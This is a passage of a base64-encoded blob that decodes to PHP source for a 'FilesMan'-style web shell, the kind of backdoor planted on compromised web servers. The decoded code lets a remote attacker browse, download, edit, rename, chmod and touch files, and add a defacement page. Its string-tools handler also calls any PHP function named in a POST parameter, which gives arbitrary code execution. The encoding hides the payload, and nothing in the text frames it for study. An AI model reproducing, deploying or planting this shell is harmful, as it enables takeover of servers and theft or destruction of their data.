udWxsLFwnJyAuIHVybGVuY29kZSgkZlsnbmFtZSddKSAuICdcJywgXCdlZGl0XCcpIj5FPC9hPiA8YSBocmVmPSIjIiBvbmNsaWNrPSJnKFwnRmlsZXNUb29sc1wnLG51bGwsXCcnIC4gdXJsZW5jb2RlKCRmWyduYW1lJ10pIC4gJ1wnLCBcJ2Rvd25sb2FkXCcpIj5EPC9hPicgOiAnJykgLiAnPC90ZD48L3RyPic7CiAgICAgICAgJGwgPSAkbCA/IDAgOiAxOwogICAgfQogICAgZWNobyAnPHRyPjx0ZCBjb2xzcGFuPTU+CiAgICA8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPVwnRmlsZXNNYW5cJz4KICAgIDxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWMgdmFsdWU9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRHTE9CQUxTWydjd2QnXSkgLiAnIj4KICAgIDxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNoYXJzZXQgdmFsdWU9IicgLiAoaXNzZXQoJF9QT1NUWydjaGFyc2V0J10pID8gJF9QT1NUWydjaGFyc2V0J10gOiAnJykgLiAnIj4KICAgIDxzZWxlY3QgbmFtZT1cJ3AxXCc+PG9wdGlvbiB2YWx1ZT1cJ2NvcHlcJz5Db3B5PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT1cJ21vdmVcJz5Nb3ZlPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT1cJ2RlbGV0ZVwnPkRlbGV0ZTwvb3B0aW9uPic7CiAgICBpZiAoIWVtcHR5KCRfU0VTU0lPTlsnYWN0J10pICYmIEBjb3VudCgkX1NFU1NJT05bJ2YnXSkpIHsKICAgICAgICBlY2hvICc8b3B0aW9uIHZhbHVlPVwncGFzdGVcJz5QYXN0ZTwvb3B0aW9uPic7CiAgICB9CiAgICBlY2hvICc8L3NlbGVjdD4mbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iPj4iPjwvdGQ+PHRkIGNvbHNwYW49IjIiIGFsaWduPSJyaWdodCIgd2lkdGg9IjEiPjxpbnB1dCBuYW1lPSJkZWYiIGlkPSJkZWYiIHZhbHVlPSJpbmRleC5waHAiIHNpemU9IjEwIi8+Jm5ic3A7PGlucHV0IHR5cGU9ImJ1dHRvbiIgb25jbGljaz0iZyhcJ0ZpbGVzTWFuXCcsXCcnIC4gaHRtbHNwZWNpYWxjaGFycygkR0xPQkFMU1snY3dkJ10pIC4gJ1wnLFwnZGVmYWNlXCcsZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCdkZWZcJykudmFsdWUpIiB2YWx1ZT0iQWRkIHlvdXIgRGVmYWNlIj48L3RkPjwvdHI+CiAgICA8L2Zvcm0+PC90YWJsZT48L2Rpdj4nOwogICAgcHJpbnRGb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uU3RyaW5nVG9vbHMoKQp7CiAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnaGV4MmJpbicpKSB7CiAgICAgICAgZnVuY3Rpb24gaGV4MmJpbigkcCkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBkZWNiaW4oaGV4ZGVjKCRwKSk7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2hleDJhc2NpaScpKSB7CiAgICAgICAgZnVuY3Rpb24gaGV4MmFzY2lpKCRwKQogICAgICAgIHsKICAgICAgICAgICAgJHIgPSAnJzsKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgc3RyTGVuKCRwKTsgJGkgKz0gMikgewogICAgICAgICAgICAgICAgJHIgLj0gY2hyKGhleGRlYygkcFskaV0gLiAkcFskaSArIDFdKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRyOwogICAgICAgIH0KICAgIH0KICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCdhc2NpaTJoZXgnKSkgewogICAgICAgIGZ1bmN0aW9uIGFzY2lpMmhleCgkcCkKICAgICAgICB7CiAgICAgICAgICAgICRyID0gJyc7CiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IHN0cmxlbigkcCk7ICsrJGkpCiAgICAgICAgICAgICAgICAkciAuPSBkZWNoZXgob3JkKCRwWyRpXSkpOwogICAgICAgICAgICByZXR1cm4gc3RydG91cHBlcigkcik7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2Z1bGxfdXJsZW5jb2RlJykpIHsKICAgICAgICBmdW5jdGlvbiBmdWxsX3VybGVuY29kZSgkcCkKICAgICAgICB7CiAgICAgICAgICAgICRyID0gJyc7CiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IHN0cmxlbigkcCk7ICsrJGkpCiAgICAgICAgICAgICAgICAkciAuPSAnJScgLiBkZWNoZXgob3JkKCRwWyRpXSkpOwogICAgICAgICAgICByZXR1cm4gc3RydG91cHBlcigkcik7CiAgICAgICAgfQogICAgfQogICAgCiAgICBpZiAoaXNzZXQoJF9QT1NUWydhamF4J10pKSB7CiAgICAgICAgJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJ2FqYXgnXSA9IHRydWU7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCRfUE9TVFsncDEnXSkpCiAgICAgICAgICAgIGVjaG8gJF9QT1NUWydwMSddKCRfUE9TVFsncDInXSk7CiAgICAgICAgJHRlbXAgPSAiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0ck91dHB1dCcpLnN0eWxlLmRpc3BsYXk9Jyc7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0ck91dHB1dCcpLmlubmVySFRNTD0nIiAuIGFkZGNzbGFzaGVzKGh0bWxzcGVjaWFsY2hhcnMob2JfZ2V0X2NsZWFuKCkpLCAiXG5cclx0XFwnXDAiKSAuICInO1xuIjsKICAgICAgICBlY2hvIHN0cmxlbigkdGVtcCksICJcbiIsICR0ZW1wOwogICAgICAgIGV4aXQ7CiAgICB9CiAgICBwcmludEhlYWRlcigpOwogICAgZWNobyAnPGgxPlN0cmluZyBjb252ZXJzaW9uczwvaDE+PGRpdiBjbGFzcz1jb250ZW50Pic7CiAgICAkc3RyaW5nVG9vbHMgPSBhcnJheSgKICAgICAgICAnQmFzZTY0IGVuY29kZScgPT4gJ2Jhc2U2NF9lbmNvZGUnLAogICAgICAgICdCYXNlNjQgZGVjb2RlJyA9PiAnYmFzZTY0X2RlY29kZScsCiAgICAgICAgJ1VybCBlbmNvZGUnID0+ICd1cmxlbmNvZGUnLAogICAgICAgICdVcmwgZGVjb2RlJyA9PiAndXJsZGVjb2RlJywKICAgICAgICAnRnVsbCB1cmxlbmNvZGUnID0+ICdmdWxsX3VybGVuY29kZScsCiAgICAgICAgJ21kNSBoYXNoJyA9PiAnbWQ1JywKICAgICAgICAnc2hhMSBoYXNoJyA9PiAnc2hhMScsCiAgICAgICAgJ2NyeXB0JyA9PiAnY3J5cHQnLAogICAgICAgICdDUkMzMicgPT4gJ2NyYzMyJywKICAgICAgICAnQVNDSUkgdG8gSEVYJyA9PiAnYXNjaWkyaGV4JywKICAgICAgICAnSEVYIHRvIEFTQ0lJJyA9PiAnaGV4MmFzY2lpJywKICAgICAgICAnSEVYIHRvIERFQycgPT4gJ2hleGRlYycsCiAgICAgICAgJ0hFWCB0byBCSU4nID0+ICdoZXgyYmluJywKICAgICAgICAnREVDIHRvIEhFWCcgPT4gJ2RlY2hleCcsCiAgICAgICAgJ0RFQyB0byBCSU4nID0+ICdkZWNiaW4nLAogICAgICAgICdCSU4gdG8gSEVYJyA9PiAnYmluMmhleCcsCiAgICAgICAgJ0JJTiB0byBERUMnID0+ICdiaW5kZWMnLAogICAgICAgICdTdHJpbmcgdG8gbG93ZXIgY2FzZScgPT4gJ3N0cnRvbG93ZXInLAogICAgICAgICdTdHJpbmcgdG8gdXBwZXIgY2FzZScgPT4gJ3N0cnRvdXBwZXInLAogICAgICAgICdIdG1sc3BlY2lhbGNoYXJzJyA9PiAnaHRtbHNwZWNpYWxjaGFycycsCiAgICAgICAgJ1N0cmluZyBsZW5ndGgnID0+ICdzdHJsZW4nCiAgICApOwogICAgaWYgKGVtcHR5KCRfUE9TVFsnYWpheCddKSAmJiAhZW1wdHkoJF9QT1NUWydwMSddKSkKICAgICAgICAkX1NFU1NJT05bbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnYWpheCddID0gZmFsc2U7CiAgICBlY2hvICI8Zm9ybSBuYW1lPSd0b29sc0Zvcm0nIG9uU3VibWl0PSdpZih0aGlzLmFqYXguY2hlY2tlZCl7YShudWxsLG51bGwsdGhpcy5zZWxlY3RUb29sLnZhbHVlLHRoaXMuaW5wdXQudmFsdWUpO31lbHNle2cobnVsbCxudWxsLHRoaXMuc2VsZWN0VG9vbC52YWx1ZSx0aGlzLmlucHV0LnZhbHVlKTt9IHJldHVybiBmYWxzZTsnPjxzZWxlY3QgbmFtZT0nc2VsZWN0VG9vbCc+IjsKICAgIGZvcmVhY2ggKCRzdHJpbmdUb29scyBhcyAkayA9PiAkdikKICAgICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPSciIC4gaHRtbHNwZWNpYWxjaGFycygkdikgLiAiJz4iIC4gJGsgLiAiPC9vcHRpb24+IjsKICAgIGVjaG8gIjwvc2VsZWN0PjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSc+PicvPiA8aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPWFqYXggdmFsdWU9MSAiIC4gKCRfU0VTU0lPTlttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSAuICdhamF4J10gPyAnY2hlY2tlZCcgOiAnJykgLiAiPiBzZW5kIHVzaW5nIEFKQVg8YnI+PHRleHRhcmVhIG5hbWU9J2lucHV0JyBzdHlsZT0nbWFyZ2luLXRvcDo1cHgnIGNsYXNzPWJpZ2FyZWE+IiAuIGh0bWxzcGVjaWFsY2hhcnMoQCRfUE9TVFsncDInXSkgLiAiPC90ZXh0YXJlYT48L2Zvcm0+PHByZSBjbGFzcz0nbWwxJyBzdHlsZT0nIiAuIChlbXB0eSgkX1BPU1RbJ3AxJ10pID8gJ2Rpc3BsYXk6bm9uZTsnIDogJycpIC4gIm1hcmdpbi10b3A6NXB4JyBpZD0nc3RyT3V0cHV0Jz4iOwogICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3AxJ10pKSB7CiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygkX1BPU1RbJ3AxJ10pKQogICAgICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJF9QT1NUWydwMSddKCRfUE9TVFsncDInXSkpOwogICAgfQogICAgZWNobyAiPC9wcmU+PC9kaXY+IjsKICAgIHByaW50Rm9vdGVyKCk7Cn0KCmZ1bmN0aW9uIGFjdGlvbkZpbGVzVG9vbHMoKQp7CiAgICBpZiAoaXNzZXQoJF9QT1NUWydwMSddKSkKICAgICAgICAkX1BPU1RbJ3AxJ10gPSB1cmxkZWNvZGUoJF9QT1NUWydwMSddKTsKICAgIGlmIChAJF9QT1NUWydwMiddID09ICdkb3dubG9hZCcpIHsKICAgICAgICBpZiAoaXNfZmlsZSgkX1BPU1RbJ3AxJ10pICYmIGlzX3JlYWRhYmxlKCRfUE9TVFsncDEnXSkpIHsKICAgICAgICAgICAgb2Jfc3RhcnQoIm9iX2d6aGFuZGxlciIsIDQwOTYpOwogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSIgLiBiYXNlbmFtZSgkX1BPU1RbJ3AxJ10pKTsKICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygibWltZV9jb250ZW50X3R5cGUiKSkgewogICAgICAgICAgICAgICAgJHR5cGUgPSBAbWltZV9jb250ZW50X3R5cGUoJF9QT1NUWydwMSddKTsKICAgICAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1UeXBlOiAiIC4gJHR5cGUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRmcCA9IEBmb3BlbigkX1BPU1RbJ3AxJ10sICJyIik7CiAgICAgICAgICAgIGlmICgkZnApIHsKICAgICAgICAgICAgICAgIHdoaWxlICghQGZlb2YoJGZwKSkKICAgICAgICAgICAgICAgICAgICBlY2hvIEBmcmVhZCgkZnAsIDEwMjQpOwogICAgICAgICAgICAgICAgZmNsb3NlKCRmcCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2VpZiAoaXNfZGlyKCRfUE9TVFsncDEnXSkgJiYgaXNfcmVhZGFibGUoJF9QT1NUWydwMSddKSkgewogICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmIChAJF9QT1NUWydwMiddID09ICdta2ZpbGUnKSB7CiAgICAgICAgaWYgKCFmaWxlX2V4aXN0cygkX1BPU1RbJ3AxJ10pKSB7CiAgICAgICAgICAgICRmcCA9IEBmb3BlbigkX1BPU1RbJ3AxJ10sICd3Jyk7CiAgICAgICAgICAgIGlmICgkZnApIHsKICAgICAgICAgICAgICAgICRfUE9TVFsncDInXSA9ICJlZGl0IjsKICAgICAgICAgICAgICAgIGZjbG9zZSgkZnApOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcHJpbnRIZWFkZXIoKTsKICAgIGVjaG8gJzxoMT5GaWxlIHRvb2xzPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+JzsKICAgIGlmICghZmlsZV9leGlzdHMoQCRfUE9TVFsncDEnXSkpIHsKICAgICAgICBlY2hvICdGaWxlIG5vdCBleGlzdHMnOwogICAgICAgIHByaW50Rm9vdGVyKCk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgJHVpZCA9IEBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCRfUE9TVFsncDEnXSkpOwogICAgJGdpZCA9IEBwb3NpeF9nZXRncmdpZChAZmlsZW93bmVyKCRfUE9TVFsncDEnXSkpOwogICAgZWNobyAnPHNwYW4+TmFtZTo8L3NwYW4+ICcgLiBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDEnXSkgLiAnIDxzcGFuPlNpemU6PC9zcGFuPiAnIC4gKGlzX2ZpbGUoJF9QT1NUWydwMSddKSA/IHZpZXdTaXplKGZpbGVzaXplKCRfUE9TVFsncDEnXSkpIDogJy0nKSAuICcgPHNwYW4+UGVybWlzc2lvbjo8L3NwYW4+ICcgLiB2aWV3UGVybXNDb2xvcigkX1BPU1RbJ3AxJ10pIC4gJyA8c3Bhbj5Pd25lci9Hcm91cDo8L3NwYW4+ICcgLiAkdWlkWyduYW1lJ10gLiAnLycgLiAkZ2lkWyduYW1lJ10gLiAnPGJyPic7CiAgICBlY2hvICc8c3Bhbj5DcmVhdGUgdGltZTo8L3NwYW4+ICcgLiBkYXRlKCdZLW0tZCBIOmk6cycsIGZpbGVjdGltZSgkX1BPU1RbJ3AxJ10pKSAuICcgPHNwYW4+QWNjZXNzIHRpbWU6PC9zcGFuPiAnIC4gZGF0ZSgnWS1tLWQgSDppOnMnLCBmaWxlYXRpbWUoJF9QT1NUWydwMSddKSkgLiAnIDxzcGFuPk1vZGlmeSB0aW1lOjwvc3Bhbj4gJyAuIGRhdGUoJ1ktbS1kIEg6aTpzJywgZmlsZW10aW1lKCRfUE9TVFsncDEnXSkpIC4gJzxicj48YnI+JzsKICAgIGlmIChlbXB0eSgkX1BPU1RbJ3AyJ10pKQogICAgICAgICRfUE9TVFsncDInXSA9ICd2aWV3JzsKICAgIGlmIChpc19maWxlKCRfUE9TVFsncDEnXSkpCiAgICAgICAgJG0gPSBhcnJheSgKICAgICAgICAgICAgJ1ZpZXcnLAogICAgICAgICAgICAnSGlnaGxpZ2h0JywKICAgICAgICAgICAgJ0Rvd25sb2FkJywKICAgICAgICAgICAgJ0hleGR1bXAnLAogICAgICAgICAgICAnRWRpdCcsCiAgICAgICAgICAgICdDaG1vZCcsCiAgICAgICAgICAgICdSZW5hbWUnLAogICAgICAgICAgICAnVG91Y2gnCiAgICAgICAgKTsKICAgIGVsc2UKICAgICAgICAkbSA9IGFycmF5KAogICAgICAgICAgICAnQ2htb2QnLAogICAgICAgICAgICAnUmVuYW1lJywKICAgICAgICAgICAgJ1RvdWNoJwogICAgICAgICk7CiAgICBmb3JlYWNoICgkbSBhcyAkdikKICAgICAgICBlY2hvICc8YSBocmVmPSMgb25jbGljaz0iZyhudWxsLG51bGwsbnVsbCxcJycgLiBzdHJ0b2xvd2VyKCR2KSAuICdcJykiPicgLiAoKHN0cnRvbG93ZXIoJHYpID09IEAkX1BPU1RbJ3AyJ10pID8gJzxiPlsgJyAuICR2IC4gJyBdPC9iPicgOiAkdikgLiAnPC9hPiAnOwogICAgZWNobyAnPGJyPjxicj4nOwogICAgc3dpdGNoICgkX1BPU1RbJ3AyJ10pIHsKICAgICAgICBjYXNlICd2aWV3JzoKICAgICAgICAgICAgZWNobyAnPHByZSBjbGFzcz1tbDE+JzsKICAgICAgICAgICAgJGZwID0gQGZvcGVuKCRfUE9TVFsncDEnXSwgJ3InKTsKICAgICAgICAgICAgaWYgKCRmcCkgewogICAgICAgICAgICAgICAgd2hpbGUgKCFAZmVvZigkZnApKQogICAgICAgICAgICAgICAgICAgIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhAZnJlYWQoJGZwLCAxMDI0KSk7CiAgICAgICAgICAgICAgICBAZmNsb3NlKCRmcCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWNobyAnPC9wcmU+JzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAnaGlnaGxpZ2h0JzoKICAgICAgICAgICAgaWYgKGlzX3JlYWRhYmxlKCRfUE9TVFsncDEnXSkpIHsKICAgICAgICAgICAgICAgIGVjaG8gJzxkaXYgY2xhc3M9bWwxIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztjb2xvcjpibGFjazsiPic7CiAgICAgICAgICAgICAgICAkY29kZSA9IGhpZ2hsaWdodF9maWxlKCRfUE9TVFsncDEnXSwgdHJ1ZSk7CiAgICAgICAgICAgICAgICBlY2hvIHN0cl9yZXBsYWNlKGFycmF5KAogICAgICAgICAgICAgICAgICAgICc8c3BhbiAnLAogICAgICAgICAgICAgICAgICAgICc8L3NwYW4+JwogICAgICAgICAgICAgICAgKSwgYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgJzxmb250ICcsCiAgICAgICAgICAgICAgICAgICAgJzwvZm9udD4nCiAgICAgICAgICAgICAgICApLCAkY29kZSkgLiAnPC9kaXY+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdjaG1vZCc6CiAgICAgICAgICAgIGlmICghZW1wdHkoJF9QT1NUWydwMyddKSkgewogICAgICAgICAgICAgICAgJHBlcm1zID0gMDsKICAgICAgICAgICAgICAgIGZvciAoJGkgPSBzdHJsZW4oJF9QT1NUWydwMyddKSAtIDE7ICRpID49IDA7IC0tJGkpCiAgICAgICAgICAgICAgICAgICAgJHBlcm1zICs9IChpbnQpICRfUE9TVFsncDMnXVskaV0gKiBwb3coOCwgKHN0cmxlbigkX1BPU1RbJ3AzJ10pIC0gJGkgLSAxKSk7CiAgICAgICAgICAgICAgICBpZiAoIUBjaG1vZCgkX1BPU1RbJ3AxJ10sICRwZXJtcykpCiAgICAgICAgICAgICAgICAgICAgZWNobyAnQ2FuXCd0IHNldCBwZXJtaXNzaW9ucyE8YnI+PHNjcmlwdD5kb2N1bWVudC5tZi5wMy52YWx1ZT0iIjs8L3NjcmlwdD4nOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGRpZSgnPHNjcmlwdD5nKG51bGwsbnVsbCxudWxsLG51bGwsIiIpPC9zY3JpcHQ+Jyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWNobyAnPGZvcm0gb25zdWJtaXQ9ImcobnVsbCxudWxsLG51bGwsbnVsbCx0aGlzLmNobW9kLnZhbHVlKTtyZXR1cm4gZmFsc2U7Ij48aW5wdXQgdHlwZT10ZXh0IG5hbWU9Y2htb2QgdmFsdWU9IicgLiBzdWJzdHIoc3ByaW50ZignJW8nLCBmaWxlcGVybXMoJF9QT1NUWydwMSddKSksIC00KSAuICciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT4nOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdlZGl0JzoKICAgICAgICAgICAgaWYgKCFpc193cml0YWJsZSgkX1BPU1RbJ3AxJ10pKSB7CiAgICAgICAgICAgICAgICBlY2hvICdGaWxlIGlzblwndCB3cml0ZWFibGUnOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCFlbXB0eSgkX1BPU1RbJ3AzJ10pKSB7CiAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJF9QT1NUWydwMSddLCAkX1BPU1RbJ3AzJ10pOwogICAgICAgICAgICAgICAgZWNobyAnU2F2ZWQhPGJyPjxzY3JpcHQ+ZG9jdW1lbnQubWYucDMudmFsdWU9IiI7PC9zY3JpcHQ+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvICc8Zm9ybSBvbnN1Ym1pdD0iZyhudWxsLG51bGwsbnVsbCxudWxsLHRoaXMudGV4dC52YWx1ZSk7cmV0dXJuIGZhbHNlOyI+PHRleHRhcmVhIG5hbWU9dGV4dCBjbGFzcz1iaWdhcmVhPic7CiAgICAgICAgICAgICRmcCA9IEBmb3BlbigkX1BPU1RbJ3AxJ10sICdyJyk7CiAgICAgICAgICAgIGlmICgkZnApIHsKICAgICAgICAgICAgICAgIHdoaWxlICghQGZlb2YoJGZwKSkKICAgICAgICAgICAgICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoQGZyZWFkKCRmcCwgMTAyNCkpOwogICAgICAgICAgICAgICAgQGZjbG9zZSgkZnApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVjaG8gJzwvdGV4dGFyZWE+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSI+PiI+PC9mb3JtPic7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgJ2hleGR1bXAnOgogICAgICAgICAgICAkYyAgID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsncDEnXSk7CiAgICAgICAgICAgICRuICAgPSAwOwogICAgICAgICAgICAkaCAgID0gYXJyYXkoCiAgICAgICAgICAgICAgICAnMDAwMDAwMDA8YnI+JywKICAgICAgICAgICAgICAgICcnLAogICAgICAgICAgICAgICAgJycKICAgICAgICAgICAgKTsKICAgICAgICAgICAgJGxlbiA9IHN0cmxlbigkYyk7CiAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW47ICsrJGkpIHsKICAgICAgICAgICAgICAgICRoWzFdIC49IHNwcmludGYoJyUwMlgnLCBvcmQoJGNbJGldKSkgLiAnICc7CiAgICAgICAgICAgICAgICBzd2l0Y2ggKG9yZCgkY1skaV0pKSB7CiAgICAgICAgICAgICAgICAgICAgY2FzZSAwOgogICAgICAgICAgICAgICAgICAgICAgICAkaFsyXSAuPSAnICc7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNhc2UgOToKICAgICAgICAgICAgICAgICAgICAgICAgJGhbMl0gLj0gJyAnOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICBjYXNlIDEwOgogICAgICAgICAgICAgICAgICAgICAgICAkaFsyXSAuPSAnICc7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNhc2UgMTM6CiAgICAgICAgICAgICAgICAgICAgICAgICRoWzJdIC49ICcgJzsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICAgICAgJGhbMl0gLj0gJGNbJGldOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRuKys7CiAgICAgICAgICAgICAgICBpZiAoJG4gPT0gMzIpIHsKICAgICAgICAgICAgICAgICAgICAkbiA9IDA7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRpICsgMSA8ICRsZW4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhbMF0gLj0gc3ByaW50ZignJTA4WCcsICRpICsgMSkgLiAnPGJyPic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRoWzFdIC49ICc8YnI+JzsKICAgICAgICAgICAgICAgICAgICAkaFsyXSAuPSAiXG4iOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVjaG8gJzx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTUgYmdjb2xvcj0jcmVkPjx0cj48dGQgYmdjb2xvcj1yZWQ+PHNwYW4gc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWw7Ij48cHJlPicgLiAkaFswXSAuICc8L3ByZT48L3NwYW4+PC90ZD48dGQgYmdjb2xvcj0jcmVkPjxwcmU+JyAuICRoWzFdIC4gJzwvcHJlPjwvdGQ+PHRkIGJnY29sb3I9I3JlZD48cHJlPicgLiBodG1sc3BlY2lhbGNoYXJzKCRoWzJdKSAuICc8L3ByZT48L3RkPjwvdHI+PC90YWJsZT4nOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdyZW5hbWUnOgogICAgICAgICAgICBpZiAoIWVtcHR5KCRfUE9TVFsncDMnXSkpIHsKICAgICAgICAgICAgICAgIGlmICghQHJlbmFtZSgkX1BPU1RbJ3AxJ10sICRfUE9TVFsncDMnXSkpCiAgICAgICAgICAgICAgICAgICAgZWNobyAnQ2FuXCd0IHJlbmFtZSE8YnI+PHNjcmlwdD5kb2N1bWVudC5tZi5wMy52YWx1ZT0iIjs8L3NjcmlwdD4nOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIGRpZSgnPHNjcmlwdD5nKG51bGwsbnVsbCwiJyAuIHVybGVuY29kZSgkX1BPU1RbJ3AzJ10pIC4gJyIsbnVsbCwiIik8L3NjcmlwdD4nKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvICc8Zm9ybSBvbnN1Ym1pdD0iZyhudWxsLG51bGwsbnVsbCxudWxsLHRoaXMubmFtZS52YWx1ZSk7cmV0dXJuIGZhbHNlOyI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPW5hbWUgdmFsdWU9IicgLiBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDEnXSkgLiAnIj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+JzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAndG91Y2gnOgogICAgICAgICAgICBpZiAoIWVtcHR5KCRfUE9TVFsncDMnXSkpIHsKICAgICAgICAgICAgICAgICR0aW1lID0gc3RydG90aW1lKCRfUE9TVFsncDMnXSk7CiAgICAgICAgICAgICAgICBpZiAoJHRpbWUpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoQHRvdWNoKCRfUE9TVFsncDEnXSwgJHRpbWUsICR0aW1lKSkKICAgICAgICAgICAgICAgICAgICAgICAgZGllKCc8c2NyaXB0PmcobnVsbCxudWxsLG51bGwsbnVsbCwiIik8L3NjcmlwdD4nKTsKICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAnRmFpbCE8c2NyaXB0PmRvY3VtZW50Lm1mLnAzLnZhbHVlPSIiOzwvc2NyaXB0Pic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlCiAgICAgICAgICAgICAgICAgICAgZWNobyAnQmFkIHRpbWUgZm9ybWF0ITxzY3JpcHQ+ZG9jdW1lbnQubWYucDMudmFsdWU9IiI7PC9zY3JpcHQ+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBlY2hvICc8Zm9ybSBvbnN1Ym1pdD0iZyhudWxsLG51bGwsbnVsbCxudWxsLHRoaXMudG91Y2gudmFsdWUpO3JldHVybiBmYWxzZTsiPjxpbnB1dCB0eXBlPXRleHQgbmFtZT10b3VjaCB2YWx1ZT0iJyAuIGRhdGUoIlktbS1kIEg6aTpzIiwgQGZpbGVtdGltZSgkX1BPU1RbJ3AxJ10pKSAuICciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4iPjwvZm9ybT4nOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdta2ZpbGUnOgogICAgICAgICAgICAKICAgICAgICAgICAgYnJlYWs7CiAgICB9CiAgICBlY2hvICc8L2Rpdj4nOwogICAgcHJpbnRGb290ZXIoKTsKfQoKZnVuY3Rpb24gYWN0aW9uU2FmZU1vZGUoKQp7CiAgICAkdGVtcCA9ICcnOwogICAgb2Jfc3RhcnQoKTsKICAgIHN3aXRjaCAoJF9QT1NUWydwMSddKSB7CiAgICAgICAgY2FzZSAxOgogI